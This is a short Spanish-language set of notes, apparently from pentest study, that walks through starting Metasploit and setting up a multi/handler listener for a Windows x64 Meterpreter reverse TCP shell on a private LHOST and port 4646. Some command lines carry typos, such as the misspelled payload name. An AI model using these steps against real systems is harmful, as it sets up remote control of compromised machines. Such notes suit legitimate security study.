
Si es la primera vez que la arrancas, lo arrncas así
```
msfdb run
```
ponemos un listener
```
use exploit/multi/handler
```
Especificamos el payload
```
.set payload windows/x64/meterprete/revese_tcp
```
Una vezseteado el páyload podemos ver las opciones disponibles
```
show options
```
decirle la dirección IP
``` 
set LHOST 192.168.111.45
```
Y también el puerto 
```
set LPORT 4646
```
Y ponernos en escucha
```
run
```
